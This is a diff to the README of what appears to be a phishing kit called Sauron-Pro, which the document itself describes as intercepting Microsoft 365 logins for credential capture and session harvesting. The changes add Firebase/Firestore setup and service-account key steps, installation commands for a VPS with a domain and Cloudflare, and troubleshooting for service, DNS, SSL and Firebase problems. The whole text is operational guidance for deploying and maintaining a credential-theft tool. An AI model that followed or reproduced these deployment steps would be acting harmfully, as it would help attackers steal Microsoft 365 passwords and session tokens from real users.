@@ -18,6 +18,8 @@ Microsoft 365 login flow interception for credential capture and session harvest
 - Ubuntu 20.04+ VPS with root access
 - Domain name pointed to your server
 - Cloudflare account (free tier works)
+- **Firebase project with Firestore enabled**
+- **Firebase Admin SDK service account key (`firebaseAdmin.json`)**
 
 ### Production Release (Linux VPS)
 
@@ -29,10 +31,15 @@ wget https://github.com/Skillz147/Sauron-Pro/releases/latest/download/sauron-lin
 tar -xzf sauron-linux-amd64.tar.gz
 cd sauron
 
-# 3. One-command setup (handles everything automatically)
+# 3. Add your Firebase Admin SDK key
+# Download firebaseAdmin.json from your Firebase project console
+# and place it in the sauron directory
+cp /path/to/your/firebaseAdmin.json .
+
+# 4. One-command setup (handles everything automatically)
 sudo ./install-production.sh
 
-# 4. Get help anytime
+# 5. Get help anytime
 ./help.sh
 ```
 
@@ -134,6 +141,9 @@ sudo systemctl restart sauron
 
 # Full system verification
 ./verify-installation.sh
+
+# Test Firebase connectivity
+./test-firebase.sh
 ```
 
 ### 🔧 Configuration Helpers
@@ -162,7 +172,7 @@ sudo systemctl restart sauron
 
 ### Common Issues & Quick Fixes
 
-**🔴 Service won't start**
+#### 🔴 Service won't start
 
 ```bash
 # Check service status and logs
@@ -176,7 +186,7 @@ sudo journalctl -u sauron --no-pager -l
 ./configure-env.sh --check
 ```
 
-**🔴 "Domain not reachable" errors**
+#### 🔴 "Domain not reachable" errors
 
 ```bash
 # Test DNS resolution
@@ -189,7 +199,7 @@ curl -I https://yourdomain.com
 ./configure-env.sh --test-domain
 ```
 
-**🔴 SSL certificate issues**
+#### 🔴 SSL certificate issues
 
 ```bash
 # Check certificate status
@@ -202,7 +212,7 @@ sudo acme.sh --renew -d yourdomain.com
 sudo journalctl -u acme.sh -f
 ```
 
-**🔴 Configuration problems**
+#### 🔴 Configuration problems
 
 ```bash
 # Run configuration wizard
@@ -211,6 +221,27 @@ sudo journalctl -u acme.sh -f
 # Reset to defaults
 cp .env.example .env
 ./configure-env.sh
+```
+
+#### 🔴 Firebase connection issues
+
+```bash
+# Test Firebase connectivity
+./test-firebase.sh
+
+# Check Firebase credentials file exists
+ls -la firebaseAdmin.json
+
+# Verify Firestore logs
+grep -i "firebase\|firestore" logs/system.log
+
+# If firebaseAdmin.json is missing:
+# 1. Go to Firebase Console: https://console.firebase.google.com
+# 2. Select your project
+# 3. Go to Project Settings > Service Accounts
+# 4. Generate new private key
+# 5. Download as firebaseAdmin.json
+# 6. Upload to your server's sauron directory
 ```
 
 ## 🛠️ Development
